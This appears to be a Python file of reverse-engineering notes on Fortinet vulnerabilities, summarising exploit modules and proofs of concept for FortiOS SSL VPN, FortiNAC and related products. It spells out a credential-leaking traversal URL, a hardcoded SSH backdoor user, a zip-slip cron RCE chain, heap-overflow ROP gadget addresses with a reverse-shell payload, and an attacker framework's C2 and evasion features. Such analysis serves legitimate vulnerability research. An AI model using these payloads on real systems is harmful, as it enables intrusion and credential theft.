"""
Fortinet MSF modules + legacy CVEs + additional SSL VPN heap overflows RE
Sources:
  - msf-modules/fortios_vpnssl_creds_leak.rb (CVE-2018-13379)
  - msf-modules/fortinet_ssh_backdoor.rb (CVE-2016-1909)
  - msf-modules/fortinac_file_write.rb (CVE-2022-39952)
  - msf-modules/forticlient_ems_sqli.rb (FortiClient EMS SQLi)
  - msf-modules/fortimail_login_bypass.rb (FortiMail login bypass)
  - cve-pocs/CVE-2022-42475 + CVE-2023-27997 (SSL VPN heap overflow)
  - cve-pocs-extra/Fortinet-Hunter-2026 (attack framework)
Products: FortiOS SSL VPN, FortiNAC, FortiClient EMS, FortiMail
"""

# ---------------------------------------------------------
# CVE-2018-13379: FortiOS SSL VPN path traversal -- plaintext VPN session creds
# ---------------------------------------------------------
CVE_2018_13379 = {
    "cve":      "CVE-2018-13379",
    "product":  "Fortinet FortiOS -- SSL VPN (sslvpnd)",
    "cvss":     "9.8 (Critical) -- CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "class":    "Path traversal to read sslvpn_websession; contains plaintext VPN credentials",
    "endpoint": "GET /fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
    "source":   "msf-modules/fortios_vpnssl_creds_leak.rb",
}

CVE_2018_13379_MECHANICS = {
    "path_traversal": (
        "The /fgt_lang endpoint accepts a 'lang' parameter that specifies a language file to read. "
        "The path traversal payload: /../../../..//////////dev/cmdb/sslvpn_websession "
        "reads the SSL VPN session database file from the FortiOS /dev/cmdb/ virtual filesystem. "
        "FortiOS's cmdb is a configuration database exposed as virtual files under /dev/cmdb/. "
        "sslvpn_websession is the binary file tracking active SSL VPN sessions."
    ),

    "session_file_format": {
        "detection": "response.body =~ /var fgt_lang/  -- FortiOS sends a JS wrapper around file contents",
        "separator_v1": "data[72..73] if data[73] == 0x01",
        "separator_v2": "data[104..109] if data[105..109] == 0x0000000001",
        "record_structure": "chunk[1] = username (ASCII, null-terminated); chunk[2] = password (plaintext)",
        "encoding": "Plaintext -- VPN session passwords stored in cleartext in the session file",
    },

    "impact": (
        "Active VPN session credentials are stored in plaintext in sslvpn_websession. "
        "An unauthenticated attacker reading this file gets all active VPN usernames and passwords. "
        "These credentials can be immediately reused for VPN login or lateral movement "
        "on corporate network resources accessible via the VPN. "
        "Historical significance: Belsen Group published 87,000+ FortiGate config dumps "
        "(including sslvpn_websession contents) in 2024 using this vulnerability from 2019."
    ),

    "re_insight": (
        "sslvpn_websession is a binary format in FortiOS's cmdb virtual filesystem. "
        "FortiOS stores VPN session credentials in plaintext -- no encryption at rest. "
        "Ablation semantic sweep for 'sslvpn_websession', 'websession', and credential write operations "
        "in sslvpnd binary reveals the session persistence implementation. "
        "The fact that passwords are plaintext implies FortiOS's session authentication does "
        "not use derived keys or one-way hashes for session validation -- "
        "the raw password must be available at each reconnect."
    ),
}


# ---------------------------------------------------------
# CVE-2016-1909: Fortinet SSH backdoor -- hardcoded 'Fortimanager_Access' username
# ---------------------------------------------------------
CVE_2016_1909 = {
    "cve":      "CVE-2016-1909",
    "product":  "Fortinet FortiOS -- SSH daemon",
    "cvss":     "10.0 (Critical) -- CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C",
    "class":    "Hardcoded SSH backdoor credential; admin shell access without password",
    "endpoint": "SSH port 22, username 'Fortimanager_Access'",
    "source":   "msf-modules/fortinet_ssh_backdoor.rb",
}

CVE_2016_1909_MECHANICS = {
    "backdoor_details": {
        "username":     "Fortimanager_Access",
        "auth_method":  "fortinet-backdoor (custom Net::SSH auth method -- undocumented SSH auth type)",
        "password":     "No password -- custom auth challenge-response built into FortiOS sshd",
        "access_level": "Admin shell equivalent",
    },

    "mechanism": (
        "FortiOS's SSH daemon implements a custom SSH authentication method beyond the standard "
        "publickey/password/keyboard-interactive methods. "
        "The 'fortinet-backdoor' auth method authenticates the username 'Fortimanager_Access' "
        "via a hardcoded challenge-response known only to the attacker and Fortinet. "
        "The MSF module implements this custom auth by registering a custom Net::SSH auth class "
        "named 'FortinetBackdoor' (class name derived from 'fortinet-backdoor' method name). "
        "Fortinet publicly acknowledged and patched this in January 2016."
    ),

    "re_insight": (
        "FortiOS sshd implements custom authentication methods in its SSH daemon binary. "
        "Ablation semantic sweep for 'Fortimanager_Access' string in sshd or libssh binary "
        "finds the backdoor handler. "
        "Post-CVE-2016-1909 FortiOS versions should not have this string -- "
        "but ablation cross-version diffing can verify whether it was truly removed "
        "or just obfuscated in later firmware versions. "
        "The pattern: Fortinet's internal management tools (FortiManager -> FortiGate SSH) "
        "used a backdoor SSH account -- this is the same trust model as FGFM device registration "
        "(CVE-2024-47575) where Fortinet's management protocol lacked proper authentication."
    ),
}


# ---------------------------------------------------------
# CVE-2022-39952: FortiNAC arbitrary file write via ZIP upload -> cron RCE
# ---------------------------------------------------------
CVE_2022_39952 = {
    "cve":      "CVE-2022-39952",
    "product":  "Fortinet FortiNAC -- configWizard/keyUpload.jsp",
    "cvss":     "9.8 (Critical) -- CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "class":    "Unauthenticated arbitrary file write via ZIP upload; escalates to cron-based RCE",
    "endpoint": "POST /configWizard/keyUpload.jsp (no auth required)",
    "source":   "msf-modules/fortinac_file_write.rb",
}

CVE_2022_39952_MECHANICS = {
    "attack_chain": (
        "Step 1: POST /configWizard/keyUpload.jsp with multipart ZIP file upload. "
        "FortiNAC extracts the ZIP to an attacker-specified directory path (zip slip). "
        "Step 2: Write a cron job file to /etc/cron.d/ (world-writable via zip slip). "
        "Step 3: Cron executes the payload as root at next minute boundary. "
        "Step 4: Payload is any Metasploit shellcode or command. "
        "No authentication required. FortiNAC versions < 9.4.1, < 9.2.6, < 9.1.8, and all 8.x."
    ),

    "zip_slip_mechanism": (
        "The keyUpload.jsp endpoint accepts a ZIP file and extracts it to a directory. "
        "The ZIP file entries use path traversal (../../etc/cron.d/payload) to write "
        "outside the intended extraction directory. "
        "FortiNAC does not validate that the extraction path stays within the expected directory. "
        "Identical class of bug as FortiConverter Lucent ZIP bomb (FCV-F05): "
        "zipfile.extractall() without path validation."
    ),

    "re_insight": (
        "FortiNAC is a Java web application (JSP/Tomcat). "
        "The keyUpload.jsp handler calls Java's ZipInputStream without validating "
        "zip entry names for path traversal. "
        "Look for ZipInputStream + File.getCanonicalPath() (or lack thereof) in FortiNAC JAR files. "
        "The /etc/cron.d/ write path is the privilege escalation -- FortiNAC runs as root. "
        "If the cron.d directory is writable by the tomcat user, the chain completes."
    ),
}


# ---------------------------------------------------------
# CVE-2022-42475 / CVE-2023-27997: FortiOS sslvpnd heap overflow via /remote/error
# ---------------------------------------------------------
CVE_SSL_VPN_HEAP_OVERFLOW = {
    "cves":     ["CVE-2022-42475", "CVE-2023-27997"],
    "product":  "Fortinet FortiOS -- sslvpnd (/remote/error handler)",
    "cvss":     "CVE-2022-42475: 9.3 Critical; CVE-2023-27997: 9.8 Critical",
    "class":    "Heap overflow via overlong POST body to /remote/error; pre-auth RCE via ROP",
    "endpoint": "POST /remote/error HTTP/1.1 (SSL VPN error handler endpoint)",
    "source":   "cve-pocs/CVE-2022-42475/cve-2022-42475.py + cve-pocs/CVE-2023-27997/CVE-2023-27997.py",
}

CVE_SSL_VPN_HEAP_OVERFLOW_MECHANICS = {
    "shared_poc_note": (
        "The two PoC files (cve-2022-42475.py and CVE-2023-27997.py) are IDENTICAL. "
        "Same gadget addresses, same hardcoded ASLR base, same endpoint, same payload structure. "
        "Both target sslvpnd /remote/error handler with the same buffer overflow trigger."
    ),

    "attack_sequence": {
        "endpoint":        "POST /remote/error",
        "overflow_trigger": "Content-Length: 115964117980 (absurdly large; causes server-side buffer over-read/overflow)",
        "overflow_payload": "b'A'*173096 + rdi + poprdi + cmd + pops + b'A'*40 + pops + rax3 + b'C'*32 + ropchain",
        "overflow_offset":  "173096 bytes of 'A' padding to reach the saved instruction pointer",
    },

    "rop_chain": {
        "execve":     "0x0042e050 -- execve() libc function",
        "poprdi":     "0x000000000042ed7e -- pop rdi; ret",
        "poprsi":     "0x000000000042f0f8 -- pop rsi; ret",
        "poprdx":     "0x000000000042f4a5 -- pop rdx; ret",
        "jmprax":     "0x0000000000433181 -- jmp rax",
        "pops":       "0x000000000165cfd7 -- pop rdx; pop rbx; pop r12; pop r13; pop rbp; ret",
        "poprax":     "0x00000000004359af -- pop rax; ret",
        "pivot_gadget": "0x0000000001697e0d -- push rbx; sbb [rbx+0x41], bl; pop rsp; pop rbp; ret",
    },

    "aslr_observation": (
        "hardcoded = 0x00007fc5f128e000 -- comment: 'hardcoded value which would probably need to be bruteforced or leaked'. "
        "This is the hardcoded ASLR base for the sslvpnd stack. "
        "rdi = hardcoded + 0xc48; cmd = hardcoded + 0xd38. "
        "ROP chain references addresses relative to this hardcoded stack base. "
        "The PoC works against a specific FortiOS version where ASLR was either: "
        "(1) Not enabled for sslvpnd (fixed stack layout), or "
        "(2) Bruteforceable (16-bit ASLR entropy on 32-bit systems -- not applicable for x64), or "
        "(3) Leaked via a pre-exploitation info leak (not shown in this PoC)."
    ),

    "python_payload": {
        "binary":   "/bin/python",
        "flag":     "-c",
        "payload": "socket + dup2 + fork + execve('/bin/sh') -- classic PTY reverse shell",
        "note":     "FortiOS ships /bin/python in addition to /bin/node -- both confirmed as code exec paths",
    },

    "gadget_addresses_match_21762": (
        "The sslvpnd gadget addresses in CVE-2022-42475/CVE-2023-27997 differ from CVE-2024-21762. "
        "CVE-2024-21762 targets /remote/hostcheck_validate with different gadgets. "
        "The two PoCs target different FortiOS versions of sslvpnd. "
        "NONE of the PoC gadgets target ASLR-randomized positions -- all are fixed-offset binary addresses. "
        "This confirms that sslvpnd is compiled without PIE in the targeted FortiOS versions."
    ),

    "re_insight": (
        "Three sslvpnd RCE PoCs available (CVE-2022-42475, CVE-2023-27997, CVE-2024-21762). "
        "All exploit heap overflows in different handlers (/remote/error vs /remote/hostcheck_validate). "
        "All use ROP chains with fixed binary addresses (no PIE). "
        "Ablation semantic sweep for 'remote/error', 'hostcheck_validate', 'Content-Length' parsing, "
        "and heap allocation patterns in sslvpnd binary reveals: "
        "(1) The overflow-vulnerable allocation site, "
        "(2) The execve/execl callsite used for code execution, "
        "(3) Whether PIE is enabled (cross-version binary comparison of load addresses). "
        "Cross-version ablation: compare sslvpnd from FortiOS 7.0.x, 7.2.x, 7.4.x -- "
        "track whether the /remote/error handler was rewritten or just patched."
    ),
}


# ---------------------------------------------------------
# Fortinet-Hunter-2026 framework -- attack tool surface inventory
# ---------------------------------------------------------
FORTINET_HUNTER_2026 = {
    "id":       "FHUNTER-SYSTEMIC",
    "product":  "Fortinet FortiOS + all products (attacker framework)",
    "source":   "cve-pocs-extra/Fortinet-Hunter-2026/GUIDE.md",
    "version":  "v2026.08 -- 97 plugins, 58 CVEs, 809 passed tests",
    "author":   "YogSotho - BrokenSec",
    "severity": "INFORMATIONAL -- attacker framework; documents complete Fortinet attack surface",

    "attack_surface_covered": [
        "scan: fingerprint + detect + fuzz + post-exploitation",
        "chain: multi-stage attack chains",
        "agent: agentic orchestrator loop (autonomous exploitation)",
        "path: attack-path graph planner",
        "score: CVE ranking (EPSS/KEV/ML/success rate)",
        "beacon: C2 beacon (Tor/DoH)",
        "doh-server: RFC 8484 DoH listener (C2 channel)",
        "evade: evasion primitives",
        "darkweb: dark-web credential monitoring",
        "sniff: passive auth sniffer",
        "crack: SH2/AK1 hash cracking (FortiOS-specific hash formats)",
        "brute: .txt brute-force (Belsen-ready -- references Belsen Group FortiGate dumps)",
        "megalodon: CI/CD worm IOC scan",
        "fuzz: SSL-VPN/WebSocket fuzzer",
        "persist: persistence mechanisms",
        "fgfm: FGFM probe (FortiManager protocol scanner)",
        "osint: Shodan/Censys/FOFA discovery",
        "extract: firmware/hardware extraction",
    ],

    "re_relevance": (
        "The framework covers 58 CVEs against Fortinet products with 97 plugins. "
        "The 'crack' module targets FortiOS-specific hash formats 'SH2' and 'AK1' -- "
        "these are not standard hash types and suggest FortiOS uses non-standard password hashing. "
        "Ablation semantic sweep for 'SH2', 'AK1', password hash comparison functions "
        "in FortiOS authentication binaries (sslvpnd, httpsd, authd) reveals "
        "the custom hashing algorithm. "
        "The 'Belsen-ready' brute-force module references the Belsen Group's 2024 credential dump "
        "of 87,000+ FortiGate configs -- the framework is designed to consume leaked credentials "
        "at scale against live targets."
    ),

    "fortios_hash_formats": {
        "SH2": "Unknown -- may be SHA-256 variant or FortiOS custom PBKDF",
        "AK1": "Unknown -- may be AES-128-based key derivation (cf. CVE-2019-6693 AES-128 'Mary had a littl key')",
        "priority": "ABLATION TARGET -- semantic sweep for password hash generation in FortiOS authd/cmdbsrv",
    },
}


# ---------------------------------------------------------
# CVE-2016-1909 SSH backdoor: cross-product pattern analysis
# ---------------------------------------------------------
FORTINET_BACKDOOR_PATTERN = {
    "id":       "BACKDOOR-SYSTEMIC",
    "product":  "Fortinet FortiOS (historical) -- systemic hardcoded credential pattern",
    "severity": "INFORMATIONAL -- historical; illustrates Fortinet's internal access design",

    "backdoor_history": [
        "CVE-2016-1909: SSH backdoor 'Fortimanager_Access' -- FortiOS SSH admin access",
        "CVE-2024-55591: 'GIANTYELLOWDUCK' local WebSocket token -- FortiOS CLI access",
        "CVE-2022-40684: 'Report Runner' User-Agent + Forwarded header -- FortiOS API access",
        "CVE-2019-6693: AES-128 encryption key 'Mary had a littl key' -- FortiOS config decryption",
    ],

    "pattern": (
        "Fortinet repeatedly ships hardcoded credentials/tokens/keys as internal convenience features "
        "that later become exploitable backdoors. "
        "The pattern: each product component (SSH, WebSocket CLI, API, config encryption) "
        "has an internal access mechanism that bypasses the normal authentication path. "
        "These mechanisms are designed for Fortinet's own management tools (FortiManager, FortiAnalyzer) "
        "but the credentials are embedded in the product binary and thus discoverable via RE. "
        "Each discovery follows the same RE path: "
        "  strings binary | grep -E 'password|token|key|access|duck|runner' "
        "  -> find the authentication bypass string -> understand the handler."
    ),
}
